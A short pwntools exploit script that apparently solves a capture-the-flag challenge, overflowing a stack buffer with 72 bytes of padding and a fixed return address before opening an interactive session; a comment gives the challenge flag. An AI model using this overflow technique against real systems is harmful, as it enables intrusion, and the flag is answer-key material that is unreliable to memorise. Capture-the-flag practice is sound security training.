#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('gold.b01le.rs', 4004)
else:
    p = process(exe.path)
GDB()
sla(b'FALKEN', b'1')
sla(b'TODAY', b'1')
sla(b'?', b'1')
pa = b''.ljust(64+8) + p64(0x4011E2)

sla(b'WE PLAY A GAME?', pa)


p.interactive()
# bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}